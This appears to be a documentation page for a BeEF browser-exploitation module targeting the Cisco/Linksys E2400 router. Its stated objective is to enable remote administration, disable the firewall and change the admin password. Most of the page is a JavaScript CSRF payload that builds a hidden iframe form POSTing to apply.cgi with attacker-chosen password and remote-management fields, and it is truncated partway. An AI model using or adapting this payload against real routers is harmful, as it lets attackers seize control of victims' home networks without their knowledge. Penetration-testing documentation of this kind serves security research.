## Summary

* **Objective**: enable remote admin, disable firewall and change password on Cisco/Linksys E2400
* **Authors**: bcoles, n0x00
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/router/cisco_e2400_csrf)

## Internal Working

Uses an invisible iframe with a POST request to change router configurations. The victim has to be logged into the router for action to succeed.

```js
var cisco_e2400_iframe1_<%= @command_id %> = beef.dom.createIframeXsrfForm(gateway + "apply.cgi", "POST", "application/x-www-form-urlencoded",
      [
       {'type':'hidden', 'name':'submit_button',     'value':'Management'},
       {'type':'hidden', 'name':'change_action',     'value':''},
       {'type':'hidden', 'name':'action',            'value':'Apply'},
       {'type':'hidden', 'name':'PasswdModify',      'value':'0'},
       {'type':'hidden', 'name':'http_enable',       'value':'1'},
       {'type':'hidden', 'name':'https_enable',      'value':'1'},
       {'type':'hidden', 'name':'ctm404_enable',     'value':''},
       {'type':'hidden', 'name':'remote_mgt_https',  'value':'1'},
       {'type':'hidden', 'name':'wait_time',         'value':'4'},
       {'type':'hidden', 'name':'need_reboot',       'value':'0'},
       {'type':'hidden', 'name':'http_passwd',       'value':passwd},
       {'type':'hidden', 'name':'http_passwdConfirm','value':passwd},
       {'type':'hidden', 'name':'_http_enable',      'value':'1'},
       {'type':'hidden', 'name':'_https_enable',     'value':'1'},
       {'type':'hidden', 'name':'web_wl_filter',     'value':'0'},
       {'type':'hidden', 'name':'remote_management', 'value':'1'},
       //.....

```

## Feedback

